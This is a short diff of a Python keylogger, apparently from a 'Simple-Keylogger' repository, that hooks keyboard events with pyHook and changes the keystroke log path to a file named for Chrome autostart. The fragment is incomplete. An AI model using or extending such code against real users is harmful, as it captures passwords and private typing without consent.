@@ -1,5 +1,5 @@
 import pyHook, pythoncom, sys, logging
-file_log = 'C:\\Users\\Keshav Malpani\\Documents\\GitHub\\Simple-Keylogger\\keyloggeroutput.txt'
+file_log = 'C:\\Users\\Keshav Malpani\\Documents\\GitHub\\Simple-Keylogger\\keyloggeroutput-chromeautostart.txt'
 def OnKeyboardEvent(event):
     logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
     chr(event.Ascii)
